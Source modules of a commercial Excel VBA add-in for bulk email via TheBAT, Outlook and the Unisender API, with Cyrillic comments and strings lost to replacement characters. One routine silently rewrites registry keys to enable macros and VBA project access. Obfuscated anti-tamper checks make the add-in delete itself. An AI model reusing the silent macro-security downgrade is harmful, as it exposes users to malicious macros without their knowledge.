                AddAttachment item
            Next
        End If
    Next
End Sub


' ========================= |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| TheBAT ===============================
Function Get_TheBAT_Batch_Command$()
    On Error Resume Next: Err.Clear
    If Not Email Like "*?@?*.?*" Then Exit Function

    strTO$ = "TO=" & Chr(34) & Email & Chr(34) & ";"
    strSUBJECT$ = "SUBJECT=" & Chr(34) & Replace(Subject, """", "`") & Chr(34) & ";"

    user$ = SETT.GetText("ComboBox_TheBAT_Account", "")
    If Len(user$) Then strUSER$ = "USER=" & Chr(34) & user$ & Chr(34) & ";"
    pass$ = SETT.GetText("TextBox_TheBAT_Password", "")
    If Len(pass$) Then strPASS$ = "PASSWORD=" & Chr(34) & pass$ & Chr(34) & ";"

    Randomize: filename$ = Environ("temp") & "\TheBAT." & UniqueNumber & ".txt"        ' & Fix(Rnd() * 1E+15)
    ff = FreeFile: Open filename$ For Output As #ff
    Print #ff, Body: Close #ff
    strTEXT$ = "TEXT=" & Chr(34) & filename$ & Chr(34) & ";"

    For Each file In Attachments
        strATTACH$ = strATTACH$ & "A=" & Chr(34) & file & Chr(34) & ";"
    Next

    Get_TheBAT_Batch_Command$ = "/MAIL;" & strUSER$ & strPASS$ & strTO$ & strSUBJECT$ & strTEXT$ & strATTACH$
End Function

Function Get_TheBAT_Send_Command$()
    On Error Resume Next: Err.Clear

    strTO$ = "TO=" & Chr(34) & Email & Chr(34) & ";"        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    strSUBJECT$ = "SUBJECT=" & Chr(34) & Replace(Subject, """", "`") & Chr(34) & ";"        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    user$ = SETT.GetText("ComboBox_TheBAT_Account", "")
    If Len(user$) Then strUSER$ = "USER=" & Chr(34) & user$ & Chr(34) & ";"
    pass$ = SETT.GetText("TextBox_TheBAT_Password", "")
    If Len(pass$) Then strPASS$ = "PASSWORD=" & Chr(34) & pass$ & Chr(34) & ";"

    Randomize: filename$ = Environ("temp") & "\mail." & Fix(Rnd() * 1E+15)
    ff = FreeFile: Open filename$ For Output As #ff
    Print #ff, Body: Close #ff        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|

    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    strTEXT$ = "TEXT=" & Chr(34) & filename$ & Chr(34) & ";"

    ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
    For Each file In Attachments
        strATTACH$ = strATTACH$ & "A=" & Chr(34) & file & Chr(34) & ";"
    Next

    Get_TheBAT_Send_Command$ = Chr(34) & TheBAT_PATH & Chr(34) & " /MAIL;" & strUSER$ & strPASS$ & strTO$ & strSUBJECT$ & _
                               strTEXT$ & strATTACH$ & " /MINIMIZE"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
End Function

Function Send() As Boolean
    On Error Resume Next: Err.Clear
    cmd$ = Get_TheBAT_Send_Command$
    CreateObject("WScript.Shell").Exec cmd$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Send = Err = 0
End Function

Attribute VB_Name = "Letters"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : Letters
' Author        : |fffd||fffd||fffd||fffd||fffd|                     Date: 30.07.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text

Public Items As New Collection

Function CreateNewLetter() As Letter
    On Error Resume Next: Err.Clear
    Set CreateNewLetter = New Letter
    CreateNewLetter.Email = SETT.GetText("TextBox_MailTo")
    CreateNewLetter.CC = SETT.GetText("TextBox_Mail_CC")
    CreateNewLetter.BCC = SETT.GetText("TextBox_Mail_BCC")

    CreateNewLetter.Subject = SETT.GetText("TextBox_MailSubject")
    CreateNewLetter.Body = SETT.GetText("TextBox_MailBody")
    Items.Add CreateNewLetter
End Function

Function SendAll(Optional ByRef SendErr$) As Boolean
    On Error Resume Next: Err.Clear
    Select Case SETT.GetNumber("MultiPage_SendMode")
        Case 0        ' TheBAT
            MailClient$ = "TheBAT": SendAll = SendAll_using_TheBAT
        Case 1        ' Outlook
            MailClient$ = "Outlook": SendAll = SendAll_using_Outlook(SendErr$)
        Case 2        ' API (unisender)
            MailClient$ = "API": SendAll = SendAll_using_API
    End Select
    AppActivate Application.Name
End Function

Function SendAll_using_API() As Boolean
    On Error Resume Next: Err.Clear
    Dim ImmediateSend As Boolean, api_key$, URL$, sender_name$, sender_email$, list_id$, Err_Field$, Err_Labels$
    ImmediateSend = SETT.GetBoolean("CheckBox_ImmediateSendMail")

    URL$ = "https://api.unisender.com/ru/api/sendEmail"
    api_key$ = Trim(SETT.GetText("TextBox_EmailAPI_APIkey"))
    sender_name$ = SETT.GetText("TextBox_EmailAPI_SenderName")
    sender_email$ = Trim(SETT.GetText("TextBox_EmailAPI_SenderEmail"))
    list_id$ = Split(Trim(SETT.GetText("ComboBox_EmailAPI_ListID")), "=")(0)
    'Debug.Print list_id$

    If sender_name$ = "" Then Err_Field$ = "TextBox_EmailAPI_SenderName": Err_Labels$ = Err_Labels$ & IIf(Err_Labels$ = "", "", "|") & "Label_EmailAPI_SenderName"
    If sender_email$ = "" Then Err_Field$ = "TextBox_EmailAPI_SenderEmail": Err_Labels$ = Err_Labels$ & IIf(Err_Labels$ = "", "", "|") & "Label_EmailAPI_SenderEmail"
    If list_id$ = "" Then Err_Field$ = "TextBox_EmailAPI_ListID": Err_Labels$ = Err_Labels$ & IIf(Err_Labels$ = "", "", "|") & "Label_EmailAPI_ListID"
    If api_key$ = "" Then Err_Field$ = "TextBox_EmailAPI_APIkey": Err_Labels$ = Err_Labels$ & IIf(Err_Labels$ = "", "", "|") & "Label_EmailAPI_APIkey"

    If Len(Err_Field$) Then
        ' Debug.Print Err_Field$
        F_Settings.Show
        FormSetError F_Settings, Err_Field$, Err_Labels$
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If


    Dim L As Letter, U_txt$, n&, pi As ProgressIndicator, ind&, Email$

    Dim HTTP As WinHttpRequest, StaticPostData$, POST() As Byte, PostData$, i&, Response$, filename$, content$, AttachSize&, arr
    Set HTTP = New WinHttpRequest
    ' https://www.unisender.com/ru/support/integration/api
    ' https://support.unisender.com/index.php?/Knowledgebase/Article/View/69/0/sendemail---uproshhjonnja-otprvk-individulnykh-email-soobshhenijj&_ga=1.127073677.1479843546.1474516806

    StaticPostData$ = "format=json&error_checking=1&api_key=" & URL_Encode2(api_key$) & "&sender_name=" & URL_Encode2(sender_name$) & _
                      "&sender_email=" & URL_Encode2(sender_email$) & "&list_id=" & URL_Encode2(list_id$)

    Set pi = New ProgressIndicator
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| API |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    pi.StartNewAction , , , , , Me.Items.Count
    ReDim arr(1 To Items.Count, 1 To 6)

    For Each L In Items
        pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count:  " & L.Email
        n = n + 1: L.UniqueNumber = Format(n, "00000000")
        arr(n, 1) = n
        arr(n, 2) = L.Email
        arr(n, 3) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| email"

        If L.Email Like "*?@?*.?*" Then
            Email$ = Application.Trim(Replace(Replace(L.Email, "<", " "), ">", " "))
            Response$ = ""

            PostData$ = "email=" & URL_Encode2(Email$) & "&subject=" & URL_Encode2(L.Subject) & "&body=" & URL_Encode2(L.Body)

            For Each file In L.Attachments
                filename$ = Dir(file)
                content$ = ""
                ff& = FreeFile: Open file For Binary Access Read As #ff
                FS& = LOF(ff): content$ = String(FS&, Chr(0))
                Get #ff, , content$: Close #ff
                AttachSize& = AttachSize& + Len(content$)
                PostData$ = PostData$ & "&attachments[" & URL_Encode2(filename$) & "]=" & URL_Encode3(content$)
            Next
            pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & L.Attachments.Count & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Round(AttachSize& / 1024, 0) & " KB"
            pi.Line3 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."

            With HTTP
                .Open "POST", URL$, True
                .setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
                POST = StrConv(StaticPostData$ & "&" & PostData, vbFromUnicode)
                .Send (POST): DoEvents

                If .WaitForResponse(4) Then
                    If Val(.Status) <> 200 Then arr(n, 3) = .Status & " " & .StatusText
                    Response$ = .ResponseText
                    ' Debug.Print Response$
                    arr(n, 4) = Split(Split(Response$, """id"":""")(1), """")(0)
                    arr(n, 5) = Split(Split(Response$, """code"":""")(1), """")(0)
                    arr(n, 6) = Split(Split(Response$, """errors"":[")(1), "]")(0)
                    arr(n, 3) = IIf(arr(n, 5) = "", "", "|fffd||fffd| ") & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Else
                    Debug.Print "timeout (4 sec)  " & URL$
                    arr(n, 3) = "timeout (4 sec)"
                End If
            End With

            If InStr(1, Response$, """errors"":") = 0 Then L.AddSendMark
        End If
    Next L

    Set HTTP = Nothing
    pi.Hide

    If SETT.GetBoolean("CheckBox_EmailAPI_CreateReport") Then
        With Application.Workbooks.Add(xlWBATWorksheet).Worksheets(1)
            .Cells(1).Resize(, 6).value = Array("#", "email", "status", "id", "code", "error")
            With .Cells(2, 1).Resize(Me.Items.Count, 6)
                .value = arr
                .Borders.LineStyle = xlContinuous
                .EntireColumn.AutoFit
            End With
        End With
    End If

exitLabel:
    SETT.SetText "Email_Counter", n

    SendAll_using_API = Err = 0
End Function

Function SendAll_using_Outlook(Optional ByRef SendErr$) As Boolean
    On Error Resume Next: Err.Clear
    Dim ImmediateSend As Boolean: ImmediateSend = SETT.GetBoolean("CheckBox_ImmediateSendMail")

    Dim OA As Object: Set OA = CreateObject("Outlook.Application")
    If OA Is Nothing Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| OUTLOOK |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Function

    SendInterval_Min! = Val(Replace(SETT.GetText("TextBox_SendInterval_Min"), ",", "."))
    SendInterval_Max! = Val(Replace(SETT.GetText("TextBox_SendInterval_Max"), ",", "."))
    SendInterval_Fixed! = Application.Min(SendInterval_Min!, SendInterval_Max!)
    SendInterval_Random! = Abs(SendInterval_Min! - SendInterval_Max!)

    Dim L As Letter, U_txt$, n&, pi As ProgressIndicator, ind&
    n = SETT.GetNumber("Email_Counter", 0)

    If ImmediateSend And (SendInterval_Fixed! + SendInterval_Random! > 0.001) Then
        Set pi = New ProgressIndicator
        pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End If

    For Each L In Items
        If L.Email Like "*?@?*.?*" Then

            n = n + 1: L.UniqueNumber = Format(n, "00000000")

            With OA.CreateItem(0)        '|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                .To = L.Email: .Subject = L.Subject:
                .CC = L.CC: .BCC = L.BCC

                If L.Body Like "*<html*>*?</html>*" Then
                    .HTMLBody = L.Body
                    .BodyFormat = 2        ' olFormatHTML
                Else
                    .Body = L.Body
                    .BodyFormat = 1        ' olFormatPlain
                End If

                For Each file In L.Attachments: .Attachments.Add file: Next

                If ImmediateSend Then
                    ind& = ind& + 1: Randomize
                    SendInterval! = SendInterval_Fixed! + Rnd(ind&) * SendInterval_Random!
                    If SendInterval! > 0.001 Then
                        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| " & ind& & " |fffd||fffd| " & Me.Items.Count & "  (email: " & L.Email & ")"
                        '                    Set pi = New ProgressIndicator
                        '                    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                        Const stp& = 10: Dim t As Double, pos As Long, prev_dt As Double
                        pi.StartNewAction , , , , , SendInterval! * stp&
                        t = GetTickCount / 1000: prev_dt = 0
                        While GetTickCount / 1000 - t < SendInterval!
                            dt = GetTickCount / 1000 - t: DoEvents
                            If StopMacro Then
                                pi.Hide
                                SendErr$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                                           vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & ind& - 1 & " |fffd||fffd| " & Me.Items.Count
                                GoTo exitLabel
                            End If
                            If (dt - prev_dt) > 1 / stp& Then
                                prev_dt = dt
                                pi.SubAction msg$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Format(SendInterval!, "0.0") & " |fffd||fffd||fffd|...", _
                                             "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Format(SendInterval! - dt, "0.0") & " |fffd||fffd||fffd|..."
                                DoEvents
                            End If
                        Wend

                    Else
                        For i = 1 To 100000: DoEvents: Next        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    End If
                    Err.Clear: .Send
                    If Err = 0 Then L.AddSendMark
                Else
                    .Move OA.GetNamespace("MAPI").GetDefaultFolder(4)        ' olFolderOutbox = 4
                    L.AddSendMark
                End If
            End With
        End If
    Next L

    If ImmediateSend Then
        pi.Hide
        Set pi = Nothing
    End If

exitLabel:
    SETT.SetText "Email_Counter", n

    SendAll_using_Outlook = Err = 0
End Function


Function SendAll_using_TheBAT() As Boolean
    On Error Resume Next: Err.Clear
    batchfile$ = CreateBatchFile_TheBAT
    cmd$ = Chr(34) & TheBAT_PATH & Chr(34) & " /BATCH:" & Chr(34) & batchfile$ & Chr(34)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

    res = CreateObject("WScript.Shell").Run(cmd$)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    SendAll_using_TheBAT = res = 0
    If res = 0 Then
        Dim L As Letter
        For Each L In Me.Items
            L.AddSendMark
        Next
    End If
End Function

Private Function CreateBatchFile_TheBAT() As String
    On Error Resume Next: Err.Clear
    Dim ImmediateSend As Boolean: ImmediateSend = SETT.GetBoolean("CheckBox_ImmediateSendMail")
    Dim L As Letter, U_txt$, n&
    n = SETT.GetNumber("Email_Counter", 0)

    THEBAT_user$ = SETT.GetText("TextBox_TheBAT_LOGIN_USER", "")
    THEBAT_pass$ = SETT.GetText("TextBox_TheBAT_LOGIN_PASSWORD", "")
    If Len(THEBAT_pass$) + Len(THEBAT_user$) Then
        txt = txt & "/LOGIN;USER=""" & THEBAT_user$ & """;PASSWORD=""" & THEBAT_pass$ & """" & vbNewLine
    End If

    txt = txt & "/NOLOGO" & vbNewLine
    For Each L In Items
        n = n + 1: L.UniqueNumber = Format(n, "00000000")
        txt = txt & L.Get_TheBAT_Batch_Command & vbNewLine
    Next
    SETT.SetText "Email_Counter", n

    txt = txt & "/MINIMIZE" & vbNewLine
    If ImmediateSend Then txt = txt & "/SENDALL" & vbNewLine

    filename$ = Environ("TEMP") & "\Batch_" & n & ".txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write txt: .Close
    End With
    CreateBatchFile_TheBAT = filename$
End Function

Attribute VB_Name = "Module1"
'---------------------------------------------------------------------------------------
' Module        : Module1                    Version:
' Author        : Igor Vakhnenko                   Date: 17.10.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module

Private Sub PrintSettings_AsDefault()
    On Error Resume Next: Err.Clear: Dim arr, i&, txt
    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr)
            txt = "SetDefaultSetting """ & arr(i, 0) & """, """ & arr(i, 1) & """"
            Debug.Print txt
        Next i
    End If
End Sub

Function Add_Control(ByRef Comm_Bar, ByVal ControlType As CONTROL_TYPES, Optional ByVal B_Face&, Optional ByVal On_Action$, _
                     Optional ByVal B_Caption$, Optional ByVal Button_Style As Long = 1, _
                     Optional ByVal Begin_Group As Boolean = False, Optional Tag = "") As CommandBarControl
    On Error Resume Next
    Set Add_Control = Comm_Bar.Controls.Add(Type:=ControlType, Temporary:=True)
    With Add_Control
        If B_Face > 0 And ControlType = ct_BUTTON Then .FaceId = B_Face
        If Len(On_Action) Then
            .Tag = TWN & On_Action & "\\\" & Tag
            .OnAction = TWN & "RunMacroFromButton": If On_Action Like "Exit*" Then .OnAction = TWN & On_Action
        End If
        .Caption = B_Caption
        .BeginGroup = Begin_Group
        If ControlType = ct_BUTTON Or ControlType = ct_DROPDOWN Then .Style = Button_Style
    End With
End Function

Private Sub RunMacroFromButton()
    On Error Resume Next: Dim Macro$, param$
    Macro$ = Split(Application.CommandBars.ActionControl.Tag, "\\\")(0)
    param$ = Split(Application.CommandBars.ActionControl.Tag, "\\\")(1)
    If Macro$ Like TWN & "*" Then SETT.LastMacro Macro$
    If Len(Macro$) > O Then If Len(param$) Then Run Macro$, param$ Else Run Macro$
End Sub

Function GetCommandBar(ByVal CommandBarName As String, Optional ByVal Clean As Boolean = False, _
                       Optional ByVal Position As MsoBarPosition = 1) As CommandBar
    On Error Resume Next: Err.Clear: Dim cbc As Object
    Set GetCommandBar = Application.CommandBars(CommandBarName)
    If Err.Number Then
        Set GetCommandBar = Application.CommandBars.Add(CommandBarName, Position, False, True)
    End If
    If Clean Then
        GetCommandBar.Visible = False
        For Each cbc In GetCommandBar.Controls: cbc.Delete: Next
    End If
    GetCommandBar.Visible = True
End Function


Attribute VB_Name = "Module2"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW                    Version: 3.0
' Author        : Igor Vakhnenko                   Date: 17.10.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module
Public Const USAGE_EXAMPLE_EXISTS = True

Public Const DEBUG_MODE As Boolean = False        'True
Public Const UPDATES_HYPERLINK$ = "http://ExcelVBA.ru/php2/updates.php"

Public Const DEVELOPER_WEBSITE$ = "http://ExcelVBA.ru/"        '"http://Excel-Automation.com/"
Public Const SUPPORT_EMAIL_RUS$ = "info@ExcelVBA.ru", SUPPORT_EMAIL$ = "support@Excel-Automation.com"
Public Const BUY_NEW_HYPERLINK$ = "%website%buy/add-in?name=%projectname%"
Public Const BUY_ADD_HYPERLINK$ = "%website%buy2/add-in?name=%projectname%"
Public Const UNINSTALL_HYPERLINK$ = "%website%uninstall/program?name=%projectname%"
Public Const EULA_HYPERLINK$ = "%website%buy/EULA?name=%projectname%"
Public Const BREACH_EULA_HYPERLINK$ = "%website%buy/EULA/breach?name=%projectname%"
Public Const CABINET_HYPERLINK$ = "%website%cabinet/login"
Public Const VERSIONS_HISTORY_HYPERLINK$ = "%website%updates/history.php?addin=%projectname%"
Public SetupCancelled As Boolean, StopMacro As Boolean

#If VBA7 Then
     Declare PtrSafe Function AccessibleChildren Lib "oleacc.dll" (ByVal paccContainer As Object, ByVal iChildStart As Long, ByVal cChildren As Long, rgvarChildren As Variant, pcObtained As LongPtr) As LongPtr
#Else
     Declare Function AccessibleChildren Lib "oleacc.dll" (ByVal paccContainer As Object, ByVal iChildStart As Long, ByVal cChildren As Long, rgvarChildren As Variant, pcObtained As Long) As Long
#End If

Function PROGRAM_HYPERLINK$()
    PROGRAM_HYPERLINK$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "?ref=" & HWID
End Function

Sub Enable_AccessVBOM_Macro_DataConnections()
    On Error Resume Next: Dim sec_key$
    sec_key$ = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Excel\Security\"
    With CreateObject("WScript.Shell")
        .RegWrite sec_key$ & "AccessVBOM", 1, "REG_DWORD"
        .RegWrite sec_key$ & "VBAWarnings", 1, "REG_DWORD"
        .RegWrite sec_key$ & "DataConnectionWarnings", 0, "REG_DWORD"
    End With
End Sub

'Sub ComboChanged()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    On Error Resume Next
'    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Application.CommandBars.ActionControl.Tag
'    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Application.CommandBars.ActionControl.Text
'    MsgBox "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: """ & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| & """", _
     '           vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd| """ & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| & """"
'End Sub
'Sub AdditionalMacros()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    On Error Resume Next
'    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Application.CommandBars.ActionControl.Tag
'    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| = """ & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| & """", vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
'End Sub

Function SETT() As AddinSettings
    Static objSETT As AddinSettings
    If objSETT Is Nothing Then Set objSETT = New AddinSettings: objSETT.LoadAllSettings
    Set SETT = objSETT
End Function

Function AddinAutoRun(Optional ByVal NewState As Variant) As Boolean
    On Error Resume Next
    Dim ShortcutFullName$, AI As AddIn
    ShortcutFullName$ = Application.StartupPath & Application.PathSeparator & PROJECT_NAME$ & ".lnk"
    If Not VarType(NewState) = vbBoolean Then AddinAutoRun = FWF.FileExists(ShortcutFullName$): Exit Function

    If NewState = True Then
        With CreateObject("WScript.Shell").CreateShortcut(ShortcutFullName$)
            .TargetPath = ThisWorkbook.FullName
            .Save
        End With
    ElseIf NewState = False Then
        Kill Application.StartupPath & Application.PathSeparator & PROJECT_NAME$ & "*.lnk"
    End If
    AddinAutoRun = CBool(NewState)

    For Each AI In Application.AddIns
        If AI.Name = ThisWorkbook.Name Then AI.Installed = False
    Next AI
End Function
Function DeleteOldCommandBar(): On Error Resume Next: Run TWN & "Request_": End Function
Function UninstallThisFile(Optional ByVal Mode& = 1)
    On Error Resume Next
    If Mode& = 1 Then
        If MsgBox(tt("MSG_UninstallConfirmation"), vbExclamation + vbOKCancel + vbDefaultButton2, _
                  tt("MSG_UninstallConfirmationTitle")) = vbCancel Then Exit Function
    End If
    If TrueDeveloper Then MsgBox "Uninstalling cancelled", vbInformation, "Mode=" & Mode&: Exit Function

    AddinAutoRun False
    Application.DisplayAlerts = False
    Dim FilePath$: FilePath$ = ThisWorkbook.FullName
    ThisWorkbook.ChangeFileAccess xlReadOnly
    SetAttr FilePath$, vbNormal
    Kill FilePath$
    If Mode& = 1 Then If RUS Then FollowHyperlink UNINSTALL_HYPERLINK$
    If Mode& >= 2 Then If RUS Then FollowHyperlink BREACH_EULA_HYPERLINK$
    'If Mode& = 3 Then Request_ "action=bugger_detected"
    'Application.DisplayAlerts = True
    ThisWorkbook.Close False
End Function

Function Developer() As Boolean: Developer = TrueDeveloper And (Dir("c:\testmode", vbNormal) = ""): End Function
Function TrueDeveloper() As Boolean
    Dim txt$: txt$ = Environ(Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(68) & Chr(79) & Chr(77) & Chr(65) & Chr(73) & Chr(78)): TrueDeveloper = (txt$ Like ChrW(73) & ChrW(71) & ChrW(79) & ChrW(82) & ChrW(72) & ChrW(79) & ChrW(77) & ChrW(69) & ChrW(42)) Or (txt$ Like ChrW(73) & ChrW(71) & ChrW(79) & ChrW(82) & ChrW(87) & ChrW(79) & ChrW(82) & ChrW(75) & ChrW(42))
End Function

Function MU_() As Boolean
    On Error Resume Next: Dim x: x = ll: Err.Clear: x = ThisWorkbook.VBProject.VBComponents.Count
    If TrueDeveloper Then Exit Function
    MU_ = Err = 0: If MU_ Then UninstallThisFile 2
End Function

Function OfficeBits() As Long
    #If VBA7 And Win64 Then
        OfficeBits = 64
    #Else
        OfficeBits = 32
    #End If
End Function

Function TWN() As String: TWN = "'" & ThisWorkbook.Name & "'!": End Function
Function O() As Long
    On Error Resume Next: Dim i&, t As Double: O = 2 ^ 30: If MU_ Then Exit Function
    If AS_ > 0 Then
        O = 0
    Else
        Application.EnableCancelKey = xlDisabled: ShowMainForm
        With F_About.Controls(Chr(76) & Chr(97) & Chr(98) & Chr(101) & Chr(108) & Chr(95) & Chr(73) & Chr(110) & Chr(102) & Chr(111))
            For i = 1 To 10
                .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
            Next
        End With
